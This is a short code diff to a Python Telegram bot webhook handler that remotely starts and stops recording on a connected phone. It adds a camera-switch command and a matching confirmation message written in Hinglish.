@@ -63,6 +63,8 @@ async def telegram_webhook(secret: str, request: Request):
         await dispatch_command(chat_id, "start")
     elif cmd in ("/off", "/stopcam", "/stop_rec"):
         await dispatch_command(chat_id, "stop")
+    elif cmd in ("/switchcam", "/switch"):
+        await dispatch_command(chat_id, "switch")
     elif cmd == "/status":
         online = "Phone connected, ready" if connected_devices else "Phone offline (app band hai ya net nahi hai)"
         await tg_send_message(chat_id, online)
@@ -79,7 +81,12 @@ async def dispatch_command(chat_id: str, cmd: str):
             await ws.send_json({"cmd": cmd, "chat_id": chat_id})
         except Exception:
             pass
-    label = "Command bheja: recording ON" if cmd == "start" else "Command bheja: recording OFF"
+    if cmd == "start":
+        label = "Command bheja: recording ON"
+    elif cmd == "stop":
+        label = "Command bheja: recording OFF"
+    else:
+        label = "Command bheja: camera switch"
     await tg_send_message(chat_id, label)
 
 
